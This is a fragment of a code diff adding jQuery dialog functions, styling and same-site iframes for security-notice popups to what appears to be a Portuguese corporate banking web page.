+						beforeclose: function(event, ui) { $("body").css( {overflow: 'auto'} ); setFocus();}
+
+				});
+
+			});
+
+
+
+			function openSegurancaBPN()
+
+			{
+
+				document.getElementById('segurancaBPNFrame').src = '/CorporateBanking/v10/PT/aspx/empresas/segurancabpn/segurancabpn_index.aspx';
+
+				$('#popupSegurancaBPN').dialog('open');
+
+			}
+
+
+
+			function closeSegurancaBPN()
+
+			{
+
+				$('#popupSegurancaBPN').dialog('close');
+
+			}
+
+		</script>
+
+
+
+	<style type="text/css"> body{ font: 62.5% "Trebuchet MS", sans-serif; }
+
+		/*demo page css*/ #dialog_link {padding: .4em 1em .4em 20px;text-decoration: none;position: relative;}
+
+		#dialog_link span.ui-icon {margin: 0 5px 0 0;position: absolute;left: .2em;top: 50%;margin-top: -8px;}
+
+	</style>
+
+
+
+
+
+	<div id="popupAvisoSeguranca" style="align:left;padding:0px;margin:0px;overflow:hidden;display:none">
+
+	<IFRAME SRC="/CorporateBanking/v10/PT/aspx/empresas/segurancabpn/segurancabpnalerta_index.aspx" id="Avisoseg" WIDTH="700" HEIGHT="500" scrolling="no" style="border: 0px" frameborder="no" marginwidth="0px" marginheight="0px">
+
+	</IFRAME>
+
+	</div>
+
+
+
+
+
+	<!--<script language="JavaScript">-->
+
+	<!--	window.frames['Avisoseg'].document.location.href = "/CorporateBanking/v10/PT/aspx/empresas/segurancabpn/segurancabpnalerta_index.aspx?username="+user;-->
+
+	<!--</script>-->
+
+
+
+	<div style="visibility:hidden">
+
+
+
+		<input type="button" onclick="javascript:$('#popupAvisoSeguranca').dialog('close');" name="popupCloseBtn1" value="Button" id="popupCloseBtn1">
+
+
+
+	</div>
+
+
+
+	<div id="popupSegurancaBPN" style="align:left;padding:0px;margin:0px;overflow:hidden;">
+
+		<IFRAME ID="segurancaBPNFrame" SRC="/CorporateBanking/v10/PT/aspx/empresas/segurancabpn/segurancabpn_index.aspx" WIDTH="700px" HEIGHT="500px" scrolling="no" style="border: 0px" frameborder="no" marginwidth="0px" marginheight="0px">
+
+		</IFRAME>
+
+	</div>
+
+
+
+	</body>
+
+</HTML>
